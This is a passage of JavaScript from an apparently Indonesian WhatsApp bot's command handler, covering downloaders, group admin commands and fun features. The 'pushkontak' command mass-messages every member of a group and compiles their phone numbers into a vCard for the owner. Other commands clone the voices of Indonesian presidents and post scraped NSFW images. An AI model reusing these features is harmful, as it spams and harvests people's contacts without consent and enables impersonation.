        thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
        sourceUrl: 'https://bit.ly'
      }
    }
  };
  return sock.sendMessage(m.chat, Example, { quoted: m });
}
let user = text.replace(/[^\d]/g, ""); 
let removed = delPremiumUser(user);
if (!text) {
const DelAdd = {
    text: `• Success Delete Premium!`,
    contextInfo: {
    mentionedJid: [m.sender],
                forwardedNewsletterMessageInfo: {
                    newsletterName: "️</> Kaito Invictus </>",
                    newsletterJid: `120363403934813658@newsletter` 
                },
                isForwarded: true,
      externalAdReply: {
        showAdAttribution: true,
        title: "</> ɸ 𝐊𝐚̄𝐢𝐭𝐨Ɨ𝐧𝐯𝐢𝐜𝐭𝐮𝐬Ʃ𝐱𝐞𝐤𝐮𝐭𝐢𝐨𝐧 </>",
        body: "YussOfficial & Iqbal",
        mediaType: 1,
        thumbnailUrl: 'https://files.catbox.moe/i00wmw.jpg',
        sourceUrl: 'https://bit.ly'
      }
    }
  };
  return sock.sendMessage(m.chat, DelAdd, { quoted: m });
  }
}
break;
case "pushkontak": {
  if (!isCreator) return m.reply(`• Fitur Khusus Owner!`);
  if (!text || !text.includes("|")) return m.reply("*Contoh Command :*\n.pushkontak idgc|jeda|pesan\n\n*Note :* Jeda 1 detik = 1000\nKetik *.listgc* untuk melihat semua list ID grup");
  const [idnya, delayRaw, teks] = text.split("|");
  const delay = Number(delayRaw);
  if (!idnya.endsWith("@g.us")) return m.reply("❌ Format ID Grup Tidak Valid");
  if (isNaN(delay)) return m.reply("❌ Format Delay Darus Angka!");
  if (!teks) return m.reply("❌ Pesan Tidak Boleh Kosong!");

  let groupMetadataa;
  try {
    groupMetadataa = await sock.groupMetadata(idnya);
  } catch (e) {
    return m.reply("*ID Grup* tidak valid!");
  }
  const participants = groupMetadataa.participants;
  const halls = participants.filter(v => v.id.endsWith('.net')).map(v => v.id);
  let contacts = [];

  m.reply(`⏳ Mengirim Pesan Ke *${halls.length}* Member Grup...`);

  for (let mem of halls) {
    if (mem !== m.sender) {
      contacts.push(mem);
      fs.writeFileSync('./database/contacts.json', JSON.stringify(contacts));
      await sock.sendMessage(mem, { text: teks }, { quoted: m });
      await sleep(delay);
    }
  }

  try {
    const uniqueContacts = [...new Set(contacts)];
    const vcardContent = uniqueContacts.map(contact => {
      return [
        "BEGIN:VCARD",
        "VERSION:3.0",
        `FN:BUYER ${createSerial(2)}`,
        `TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
        "END:VCARD",
        ""
      ].join("\n");
    }).join("");

    fs.writeFileSync("./database/contacts.vcf", vcardContent, "utf8");

  } catch (err) {
    m.reply("• File Contact Berhasil Di Kirim Private Chat!");
  } finally {
    if (m.chat !== m.sender) {
      await m.reply(`✅ Berhasil mengirim pesan ke *${halls.length} member grup*`);
    }
    await sock.sendMessage(m.sender, {
      document: fs.readFileSync("./database/contacts.vcf"),
      fileName: "contacts.vcf",
      caption: "• File Kontak Berhasil Dibuat!",
      mimetype: "text/vcard",
    }, { quoted: m });
    contacts = [];
    fs.writeFileSync("./database/contacts.json", JSON.stringify(contacts));
    fs.writeFileSync("./database/contacts.vcf", "");
  }
}
break;
//=====( CASE GRUB MENU )=====\\
case "idgc": {
if (!isPremium) return m.reply(`• Fitur Khusus Premium!`)
if (!isGroup) return m.reply(`• Fitur Khusus Di Group!`)
m.reply(`${m.chat}`)
}
break;
case "cekidch": case "idch": {
    if (!text) return m.reply((`• Contoh Penggunaan :
.idch https://whatsapp.com/channel/xxxxx`))
    if (!text.includes("https://whatsapp.com/channel/")) return m.reply (`• Link Saluran Tidak Valid!`)
    let result = text.split('https://whatsapp.com/channel/')[1]
    try {
        let res = await sock.newsletterMetadata("invite", result)
        if (!res) return m.reply(`• Gagal Mengambil Metadata!`)
        let teks = `${res.id}`
        return m.reply(teks)
    } catch (error) {
        console.error(error);
        return m.reply("• Terjadi Kesalahan Saat Mengambil Metadata");
    }
}
break;
case "open": {
if (!isGroup) return m.reply(`• Fitur Khusus Di Group`)
if (!isBotAdmins) return m.reply(`• Bot Harus Jadi Admin!`)
if (!isAdmins && !isCreator) return m.reply(`• Bot Harus Jadi Admin!`)
await sock.groupSettingUpdate(m.chat, 'not_announcement')
m.reply(`• Group Telah Di Buka!`)
}
break
case "close": {
if (!isGroup) return m.reply(`• Fitur Khusus Di Group`)
if (!isBotAdmins) return m.reply(`• Bot Harus Jadi Admin!`)
if (!isAdmins && !isCreator) return m.reply(`• Bot Harus Jadi Admin!`)
await sock.groupSettingUpdate(m.chat, 'announcement')
m.reply(`• Group Telah Di Tutup!`)
}
break;
//=====( CASE FUN MENU )=====\\
case "brat": {
    if (!text) return m.reply(`• Contoh Penggunaan :
${prefix+command} Yuss Suka Nenen`);
    try {
        await sock.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
        const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false`;
        const response = await axios.get(url, { responseType: "arraybuffer" });
        await sock.sendMessage(m.chat, { sticker: response.data }, { quoted: m });
    } catch (err) {
        console.error("Error:", err);
        await sock.sendMessage(m.chat, {
            text: `• Gagal Membuat Sticker!`,
        }, { quoted: m });
    }
}
break;
case "tt": case "tiktok": {
if (!text) return m.reply(`Contoh: ${prefix + command} https://...`)
if (!text.startsWith("https://")) return m.reply(`Contoh: ${prefix + command} https://...`)
await tiktokDl(q).then(async (result) => {
await sock.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: sock.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "• Tiktok Downloader!"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await sock.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await sock.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `• Tiktok Downloader!`}, {quoted: m})
}
}).catch(e => console.log(e))
await sock.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case "listgc": {
let gcall = Object.values(await sock.groupFetchAllParticipating().catch(_=> null))
let listgc = `*｢ LIST GROUP ｣*\n\n`
await gcall.forEach((u, i) => {
listgc += `*• Nama :* ${u.subject}\n*• ID :* ${u.id}\n*• Total Member :* ${u.participants.length} Member\n*• Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n*• Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
m.reply(listgc)
}
break
case "gambar": {
 if (!text) return m.reply("Silakan masukkan prompt untuk menghasilkan gambar.");
 async function generateImage(prompt) {
 try {
 const url = `https://1yjs1yldj7.execute-api.us-east-1.amazonaws.com/default/ai_image?prompt=${encodeURIComponent(prompt)}&aspect_ratio=1:1&link=writecream.com`;
 const headers = {
 "User-Agent":
 "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Mobile Safari/537.36",
 "Referer": "https://www.writecream.com/ai-image-generator-free-no-sign-up/",
 };
const axios = require("axios");
 const response = await axios.get(url, { headers });
 if (response.data && response.data.image_link) {
 sock.sendMessage(m.chat, { image: { url: response.data.image_link }, caption: `Berikut gambar untuk: *${text}*` }, { quoted: m });
 } else {
 m.reply("Gagal mendapatkan gambar.");
 }
 } catch (error) {
 m.reply("Terjadi kesalahan saat mengambil gambar.");
 console.error(error);
 }
 }
 generateImage(text);
}
break
case "hentai": {
    try {
        const axios = require("axios");
        const cheerio = require("cheerio");
        const fetch = require("node-fetch");
        async function hentaiRandom() {
            const page = Math.floor(Math.random() * 1153);
            const response = await fetch(`https://sfmcompile.club/page/${page}`);
            const htmlText = await response.text();
            const $ = cheerio.load(htmlText);
            const list = [];
            $("#primary > div > div > ul > li > article").each(function (a, b) {
                list.push({
                    title: $(b).find("header > h2").text(),
                    link: $(b).find("header > h2 > a").attr("href"),
                    category: $(b).find("header > div.entry-before-title > span > span").text().replace("in ", ""),
                    share_count: $(b).find("header > div.entry-after-title > p > span.entry-shares").text(),
                    views_count: $(b).find("header > div.entry-after-title > p > span.entry-views").text(),
                    type: $(b).find("source").attr("type") || "image/jpeg",
                    media_url: $(b).find("source").attr("src") || $(b).find("img").attr("data-src"),
                    video_link: $(b).find("video > a").attr("href") || ""
                });
            });
            return list;
        }
        let results = await hentaiRandom();
        if (results.length === 0) return m.reply("Tidak ada konten ditemukan.");
        let randomHentai = results[Math.floor(Math.random() * results.length)];
        let caption = `*🔞 Hentai Random 🔞*\n\n`
            + `📌 *Judul:* ${randomHentai.title}\n`
            + `📂 *Kategori:* ${randomHentai.category}\n`
            + `👀 *Views:* ${randomHentai.views_count}\n`
            + `🔗 *Link Sumber:* ${randomHentai.link}\n\n`;
        let mediaType = randomHentai.type.includes("video") ? "video" : "image";
        let mediaMessage = {
            caption: caption,
            [mediaType]: { url: randomHentai.media_url }
        };
        await sock.sendMessage(m.chat, mediaMessage, { quoted: m });
    } catch (error) {
        console.error("Error di case hentai:", error);
        m.reply("Terjadi kesalahan saat mengambil konten hentai.");
    }
}
break
case "neko": case "nekopoi": {
  try {
    const fetch = require('node-fetch');
    const res = await fetch("https://nekos.life/api/v2/img/neko");
    const data = await res.json();

    if (!data.url) return m.reply("Gagal mengambil gambar.");

    await sock.sendMessage(m.chat, {
      image: { url: data.url },
      caption: "• Here Is Your Neko >•<"
    }, { quoted: m });

  } catch (e) {
    console.error("Error:", e);
    m.reply("Terjadi kesalahan saat mengambil gambar neko.");
  }
}
break;
case 'cekakunepep': case 'ff': case 'ffstalk': {
  if (!q.includes(',')) return m.reply(`Contoh: ${prefix + command} 537212033,ID`)
  let [id, region] = q.split(',').map(x => x.trim())
  if (!id || !region) return m.reply(`Contoh: ${prefix + command} 537212033,ID`)
  
  try {
    let res = await fetch(`https://www.velyn.biz.id/api/stalk/FreeFireStalk?id=${id}&region=${region}`)
    let json = await res.json()
    if (!json.status) return m.reply("Data tidak ditemukan!")
    let data = json.data.AccountInfo
    let guild = json.data.GuildInfo || {}
    let social = json.data.socialinfo || {}
    let pet = json.data.petInfo || {}
    let captain = json.data.captainBasicInfo || {}
    let credit = json.data.creditScoreInfo || {}

    let teks = `*「 STALK FREE FIRE 」*\n\n`
    teks += `*Nama:* ${data.AccountName}\n`
    teks += `*ID:* ${id}\n`
    teks += `*Region:* ${data.AccountRegion}\n`
    teks += `*Level:* ${data.AccountLevel}\n`
    teks += `*EXP:* ${data.AccountEXP.toLocaleString()}\n`
    teks += `*Likes:* ${data.AccountLikes}\n`
    teks += `*BR Rank Point:* ${data.BrRankPoint}\n`
    teks += `*CS Rank Point:* ${data.CsRankPoint}\n`
    teks += `*Badge BP:* ${data.AccountBPBadges}\n`
    teks += `*Tanggal Buat Akun:* ${new Date(data.AccountCreateTime * 1000).toLocaleString()}\n`
    teks += `*Login Terakhir:* ${new Date(data.AccountLastLogin * 1000).toLocaleString()}\n`
    teks += `*Versi Rilis:* ${data.ReleaseVersion}\n\n`
    teks += `*「 GUILD 」*\n`
    teks += `*Nama Guild:* ${guild.GuildName || '-'}\n`
    teks += `*Level:* ${guild.GuildLevel || '-'}\n`
    teks += `*Member:* ${guild.GuildMember || '-'} / ${guild.GuildCapacity || '-'}\n\n`
    teks += `*「 PET 」*\n`
    teks += `*Level:* ${pet.level || '-'}\n`
    teks += `*EXP:* ${pet.exp || '-'}\n\n`
    teks += `*「 SOSIAL 」*\n`
    teks += `*Bahasa:* ${social.AccountLanguage || '-'}\n`
    teks += `*Mode Favorit:* ${social.AccountPreferMode || '-'}\n`
    teks += `*Status:* ${social.AccountSignature || '-'}\n\n`
    teks += `*「 CAPTAIN 」*\n`
    teks += `*Nama:* ${captain.nickname || '-'}\n`
    teks += `*Level:* ${captain.level || '-'}\n`
    teks += `*Rank:* ${captain.rank || '-'} (${captain.rankingPoints || 0} pts)\n`
    teks += `*CS Rank:* ${captain.csRank || '-'} (${captain.csRankingPoints || 0} pts)\n`
    teks += `*Likes:* ${captain.liked || '-'}\n`
    teks += `*Login Terakhir:* ${new Date(captain.lastLoginAt * 1000).toLocaleString()}\n\n`
    teks += `*「 CREDIT SCORE 」*\n`
    teks += `*Nilai:* ${credit.creditScore || '-'}\n`
    teks += `*Periode:* ${new Date(credit.periodicSummaryStartTime * 1000).toLocaleDateString()} - ${new Date(credit.periodicSummaryEndTime * 1000).toLocaleDateString()}\n`
    m.reply(teks)
  } catch (e) {
    console.log(e)
    m.reply('Gagal mengambil data. Pastikan ID dan region benar.')
  }
  }
  break
 
 case "cekakunml": case "ml": {
  let inputData;
  if (argsbiyuoffc.length >= 2) {
    inputData = argsbiyuoffc[1].split('|');
  } else if (body.trim().includes('|')) {
    inputData = body.trim().split(/\s+/)[1].split('|');
  } else {
    m.reply('Format salah! Gunakan: .cekakunml id|zoneid');
    return;
  }
  if (inputData.length < 2) {
    m.reply('Format salah! Gunakan: .cekakunml id|zoneid');
    return;
  }
  const userId = inputData[0];
  const zoneId = inputData[1];
  const axios = require('axios');
  axios.get(`https://vapis.my.id/api/ml-stalk?id=${userId}&zoneid=${zoneId}`)
    .then(response => {
      const result = response.data;
      if (result.status && result.data.status.code === 0) {
        const userData = result.data.data;
        const productData = userData.product;
        const caption = `*✅ ML ACCOUNT FOUND*\n\n` +
          `*• Game*: ${productData.name}\n` +
          `*• Username*: ${userData.userNameGame}\n` +
          `*• User ID*: ${userData.gameId}\n` +
          `*• Zone ID*: ${userData.zoneId}\n` +
          `> © Developer sockOfficial`;
        m.reply(caption);
      } else {
        const errorMsg = result.data?.status?.message || 'Terjadi kesalahan saat mencari data.';
        m.reply(`❌ Error: ${errorMsg}`);
      }
    })
    .catch(error => {
      console.error(error);
      m.reply('❌ Gagal menghubungi API. Silakan coba lagi nanti.');
    });
} break
case "cewecantik": case "cecan": {
    await sock.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
    const apiEndpoints = {
        "Indonesia 🇮🇩": "https://api.siputzx.my.id/api/r/cecan/indonesia",
        "China 🇨🇳": "https://api.siputzx.my.id/api/r/cecan/china",
        "Japan 🇯🇵": "https://api.siputzx.my.id/api/r/cecan/japan",
        "Korea 🇰🇷": "https://api.siputzx.my.id/api/r/cecan/korea",
        "Thailand 🇹🇭": "https://api.siputzx.my.id/api/r/cecan/thailand",
        "Vietnam 🇻🇳": "https://api.siputzx.my.id/api/r/cecan/vietnam"
    }
    try {
    const axios = require('axios');
        let araara = new Array()
        const imagesPerCountry = 2
        for (const [country, url] of Object.entries(apiEndpoints)) {
            for (let i = 0; i < imagesPerCountry; i++) {
                try {
                    const response = await axios.get(url, { responseType: 'arraybuffer' })
                    let imgsc = await prepareWAMessageMedia(
                        { image: Buffer.from(response.data) }, 
                        { upload: sock.waUploadToServer }
                    )
                    araara.push({
                        header: proto.Message.InteractiveMessage.Header.fromObject({
                            hasMediaAttachment: true,
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            buttons: [{                  
                                "name": "cta_url",
                                "buttonParamsJson": `{\"display_text\":\"${country} Image ${i + 1}\",\"url\":\"${url}\",\"merchant_url\":\"https://www.google.com\"}`
                            }]
                        })
                    })
                    await new Promise(resolve => setTimeout(resolve, 500))
                    
                } catch (error) {
                    console.error(`Error processing image ${i + 1} for ${country}:`, error)
                    continue
                }
            }
        }
        if (araara.length === 0) {
            throw new Error('No valid images found')
        }
        const msgii = await generateWAMessageFromContent(m.chat, {
            viewOnceMessageV2Extension: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: `\nKoleksi Cecan dari Berbagai Negara\n\n• Indonesia 🇮🇩\n• China 🇨🇳\n• Japan 🇯🇵\n• Korea 🇰🇷\n• Thailand 🇹🇭\n• Vietnam 🇻🇳\n`
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                            cards: araara
                        })
                    })
                }
            }
        }, {userJid: m.sender, quoted: m})

        await sock.relayMessage(m.chat, msgii.message, { 
            messageId: msgii.key.id 
        })
        await sock.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
    } catch (error) {
        console.error('Error:', error)
        await sock.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
        return m.reply('Terjadi kesalahan saat mengambil gambar. Silahkan coba lagi.')
    }
}
break
case "waifu": {    
    await sock.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})    
    const isNsfw = (m.command === 'hentai2')
    let endpoints = [
        isNsfw ? 'https://api.waifu.pics/nsfw/waifu' : 'https://api.waifu.pics/sfw/waifu',
        isNsfw ? 'https://api.waifu.pics/nsfw/neko' : 'https://api.waifu.pics/sfw/neko'
    ]

    try {
        let allImages = []
        for (let endpoint of endpoints) {
            const images = []
            for (let i = 0; i < 2; i++) {
                const response = await fetch(endpoint)
                const data = await response.json()
                if (data && data.url) images.push(data.url)
            }
            allImages = [...allImages, ...images]
        }
        let araara = new Array()
        for (let i = 0; i < allImages.length; i++) {
            try {
                let imageUrl = allImages[i]
                let imgsc = await prepareWAMessageMedia(
                    { image: {url: imageUrl}}, 
                    { upload: sock.waUploadToServer }
                )
                
                let imageType = i < 2 ? 'Waifu' : 'Neko'
                
                araara.push({
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        hasMediaAttachment: true,
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [{                  
                            "name": "cta_url",
                            "buttonParamsJson": `{\"display_text\":\"Download ${imageType}\",\"url\":\"${imageUrl}\",\"merchant_url\":\"https://www.google.com\"}`
                        }]
                    })
                })
            } catch (error) {
                console.error('Error processing image:', error)
                continue
            }
        }

        if (araara.length === 0) {
            throw new Error('No valid images found')
        }

        const msgii = await generateWAMessageFromContent(m.chat, {
            viewOnceMessageV2Extension: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: `\nHasil pencarian ${isNsfw ? 'NSFW' : 'SFW'}\n• 2 Waifu Images\n• 2 Neko Images`
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                            cards: araara
                        })
                    })
                }
            }
        }, {userJid: m.sender, quoted: m})

        await sock.relayMessage(m.chat, msgii.message, { 
            messageId: msgii.key.id 
        })
        
        await sock.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
        
    } catch (error) {
        console.error('Error:', error)
        await sock.sendMessage(m.chat, {react: {text: '❌', key: m.key}})
        return m.reply('• Terjadi Kesalahan Saat Mengambil Gambar. Silahkan Coba Lagi!')
    }
}
break
case "demote":
case "promote": {
if (!isGroup) return m.reply(`• Fitur Khusus Di Group!`)
if (!isBotAdmins) return m.reply(`• Bot Harus Jadi Admin Terlebih Dahulu!`)
if (!isCreator && !isAdmins) return m.reply(`• Khusus Owner!`)
if (m.quoted || text) {
var action
let jid = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await sock.groupParticipantsUpdate(m.chat, [jid], action.toLowerCase()).then(async () => {
await sock.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${jid.split("@")[0]}`, mentions: [jid]}, {quoted: m})
})
} else {
return m.reply(`Contoh: ${prefix + command} @tag/628xxx`)
}
}
break
case "ht":
case "hidetag": {
  if (!isGroup) return m.reply(`• Fitur Khusus Di Group!`)
  if (!isCreator && !isAdmins) return m.reply(`• Fitur Khusus Admin/Owner!`)
  const member = participants.map(v => v.id)
  const teks = text || (m.quoted && (m.quoted.text || m.quoted.caption)) || ''
  if (!teks) return m.reply(`• Contoh Penggunaan : ${prefix + command} Pesannya`)
  await sock.sendMessage(m.chat, { text: teks, mentions: member }, { quoted: m })
}
break
case "tagall": {
  if (!isGroup) return m.reply(`• Fitur Khusus Di Group!`)
  if (!isCreator && !isAdmins) return m.reply(`• Fitur Khusus Admin/Owner!`)
  const list = participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
  if (!text) return m.reply(`• Contoh Penggunaan : ${prefix+command} Pesannya`)
  let teks = text + "" + list.map(e => '@' + e.split('@')[0]).join('')
  await sock.sendMessage(m.chat, { text: teks, mentions: list }, { quoted: m })
}
break
case 'cekganteng':
case 'cekcantik': {
  const teks = text ? text.trim() : ''
  let targetJid
  let targetName

  if (m.mentionedJid && m.mentionedJid.length > 0) {
    targetJid = m.mentionedJid[0]
    targetName = store.contacts[targetJid]?.name || targetJid.split("@")[0]
  } else if (/^\d{5,}$/.test(teks)) {
    targetJid = teks.includes('@s.whatsapp.net') ? teks : teks + '@s.whatsapp.net'
    targetName = store.contacts[targetJid]?.name || teks
  } else if (teks) {
    targetJid = m.sender
    targetName = teks
  } else {
    targetJid = m.sender
    targetName = store.contacts[m.sender]?.name || m.pushName || m.sender.split("@")[0]
  }

  const score = Math.floor(Math.random() * 100) + 1
  let komentar, emoji

  if (command === 'cekganteng') {
    if (score >= 90) {
      komentar = 'Gantengnya overload! Bikin cewek-cewek auto salfok!'
      emoji = '🔥👑💯'
    } else if (score >= 75) {
      komentar = 'Fix calon idol K-Pop, visualnya ngalahin artis!'
      emoji = '✨🧸💘'
    } else if (score >= 60) {
      komentar = 'Lumayanlah, bisa jadi cover boy majalah sekolah.'
      emoji = '😎👍'
    } else if (score >= 40) {
      komentar = 'Masih bisa ganteng... asal pake lighting dan filter 10 lapis.'
      emoji = '🤔🧼📸'
    } else if (score >= 20) {
      komentar = 'Gantengnya kayak sinyal 1 bar di hutan.'
      emoji = '📵🌲😂'
    } else {
      komentar = 'Waduh... Gantengnya disembunyiin kali ya?'
      emoji = '🥲💀👻'
    }
    const result = `*Cek Ganteng Untuk:* ${targetName}\n\n` +
                   `*Nilai Ganteng:* *${score}/100* ${emoji}\n\n` +
                   `*Komentar:* ${komentar}`
    sock.sendMessage(m.chat, {
      text: result,
      mentions: [targetJid],
    }, { quoted: m })

  } else if (command === 'cekcantik') {
    if (score >= 90) {
      komentar = 'Kecantikannya bikin bunga iri dan rembulan minder.'
      emoji = '🌷✨🌙'
    } else if (score >= 75) {
      komentar = 'Manisnya kayak senja di tepi pantai, adem banget dipandang.'
      emoji = '🌅🍬🌸'
    } else if (score >= 60) {
      komentar = 'Pesonanya sederhana tapi ngena, kayak kopi di pagi hari.'
      emoji = '☕🌼😊'
    } else if (score >= 40) {
      komentar = 'Cantik sih... tapi kayak koneksi WiFi, kadang ada kadang hilang.'
      emoji = '📶🤏😂'
    } else if (score >= 20) {
      komentar = 'Mungkin cantiknya perlu di-update ke versi terbaru.'
      emoji = '🔄🤖🫣'
    } else {
      komentar = 'Kecantikannya kayak teka-teki, masih misteri.'
      emoji = '🕵️‍♀️❓🌑'
    }
    const result = `*Cek Cantik Untuk:* ${targetName}\n\n` +
                   `*Skor Kecantikan:* *${score}/100* ${emoji}\n\n` +
                   `*Komentar:* ${komentar}`
    sock.sendMessage(m.chat, {
      text: result,
      mentions: [targetJid],
    }, { quoted: m })
  }
}
break;
case 'ttsanime': {
  if (!q) return m.reply('• Contoh Penggunaan : .ttsanime sock Suka Nenen');
  try {
    const res = await fetch(`https://flowfalcon.dpdns.org/tools/text-to-speech?text=${encodeURIComponent(q)}`);
    const json = await res.json();
    if (!json.status || !json.result) return m.reply('Gagal generate suara.');
    for (const voice of json.result) {
      const name = voice.voice_name;
      const voiceId = voice.voice_id;
      const url = Object.values(voice).find(v => typeof v === 'string' && v.startsWith('https'));
      if (url) {
        await sock.sendMessage(m.chat, {
          audio: { url },
          mimetype: 'audio/mp4',
          ptt: true,
          contextInfo: {
            externalAdReply: {
              title: `Voice: ${name}`,
              body: `Voice ID: ${voiceId}`,
              renderLargerThumbnail: true,
              mediaType: 2,
              mediaUrl: url,
              thumbnailUrl: 'https://img1.pixhost.to/images/5626/596657891_biyuofficial.jpg', 
              sourceUrl: 'https://flowfalcon.dpdns.org/tools/text-to-speech'
            }
          }
        }, { quoted: m });
        await sleep(2000); 
      }
    }
  } catch (err) {
    console.error(err);
    m.reply('• Terjadi Kesalahan!');
  }
}
break
case 'douyin': {
    if (!text) return m.reply('Masukkan kata kunci pencarian!\nContoh: douyinsearch fifty fifty');
    const axios = require('axios');
    const cheerio = require('cheerio');
    const vm = require('vm');
    const DouyinSearchPage = class {
        constructor() {
            this.baseURL = 'https://so.douyin.com/';
            this.defaultParams = {
                search_entrance: 'aweme',
                enter_method: 'normal_search',
                innerWidth: '431',
                innerHeight: '814',
                reloadNavStart: String(Date.now()),
                is_no_width_reload: '1',
                keyword: '',
            };
            this.cookies = {};
            this.api = axios.create({
                baseURL: this.baseURL,
                headers: {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id-ID,id;q=0.9',
                    'referer': 'https://so.douyin.com/',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36',
                }
            });
            this.api.interceptors.response.use(res => {
                const setCookies = res.headers['set-cookie'];
                if (setCookies) {
                    setCookies.forEach(c => {
                        const [name, value] = c.split(';')[0].split('=');
                        if (name && value) this.cookies[name] = value;
                    });
                }
                return res;
            });
            this.api.interceptors.request.use(config => {
                if (Object.keys(this.cookies).length) {
                    config.headers['Cookie'] = Object.entries(this.cookies).map(([k, v]) => `${k}=${v}`).join('; ');
                }
                return config;
            });
        }
        async initialize() {
            try {
                await this.api.get('/');
                return true;
            } catch {
                return false;
            }
        }
        async search({ query }) {
            await this.initialize();
            const params = { ...this.defaultParams, keyword: query, reloadNavStart: String(Date.now()) };
            const res = await this.api.get('s', { params });
            const $ = cheerio.load(res.data);
            let scriptWithData = '';
            $('script').each((_, el) => {
                const text = $(el).html();
                if (text.includes('let data =') && text.includes('"business_data":')) {
                    scriptWithData = text;
                }
            });
            const match = scriptWithData.match(/let\s+data\s*=\s*(\{[\s\S]+?\});/);
            if (!match) throw 'Data tidak ditemukan di halaman.';
            const dataCode = `data = ${match[1]}`;
            const sandbox = {};
            vm.createContext(sandbox);
            vm.runInContext(dataCode, sandbox);
            const awemeInfos = sandbox.data?.business_data
                ?.map(entry => entry?.data?.aweme_info)
                .filter(Boolean);
            return awemeInfos;
        }
    };

    try {
        const douyin = new DouyinSearchPage();
        const results = await douyin.search({ query: text });
        if (!results.length) return m.reply('Tidak ditemukan hasil.');
        const message = results.slice(0, 5).map((v, i) => {
            return `*${i + 1}.* ${v.desc || 'Tanpa deskripsi'}\n👤: ${v.author?.nickname}\n❤️: ${v.statistics?.digg_count} | 💬: ${v.statistics?.comment_count}\n🔗: https://www.douyin.com/video/${v.aweme_id}`;
        }).join('\n\n');
        m.reply(message);
    } catch (err) {
        console.error(err);
        m.reply('Gagal mengambil hasil pencarian Douyin.');
    }
}
break
case 'ttspresiden': {
    try {
        if (!args[0]) {
            const tokohList = `*LIST PRESIDEN YANG TERSEDIA*
*Jokowi*
*Megawati*
*Prabowo*
*Gusdur*

• Contoh Penggunaan : ${prefix}ttpresiden jokowi sockGanteng`.trim()
            return m.reply(tokohList)
        }
        const tokoh = args[0].toLowerCase()
        const teks = args.slice(1).join(' ')
        
        if (!teks) return m.reply(`• Contoh Penggunaan : ${prefix}ttspresiden sock Ganteng`)
        const availableTokoh = {
            'jokowi': { speed: -30, model: 'id-ID-ArdiNeural-Male', tune: -3 },
            'megawati': { speed: -20, model: 'id-ID-GadisNeural-Female', tune: -3 },
            'prabowo': { speed: -30, model: 'id-ID-ArdiNeural-Male', tune: -3 },
            'gusdur': { speed: -15, model: 'id-ID-ArdiNeural-Male', tune: -2 }
        }
        if (!availableTokoh[tokoh]) {
            return m.reply(`• Tokoh *${tokoh}* Tidak Tersedia. Ketik *${prefix}ttspresiden* Untuk Melihat Daftar!`)
        }
        m.reply('• Sedang Membuat Suara...')
        const session_hash = Math.random().toString(36).substring(2)
        await axios.post('https://deddy-tts-rvc-tokoh-indonesia.hf.space/queue/join?', {
            data: [
                tokoh,
                availableTokoh[tokoh].speed,
                teks,
                availableTokoh[tokoh].model,
                availableTokoh[tokoh].tune,
                'rmvpe',
                0.5,
                0.33
            ],
            event_data: null,
            fn_index: 0,
            trigger_id: 20,
            session_hash: session_hash
        })
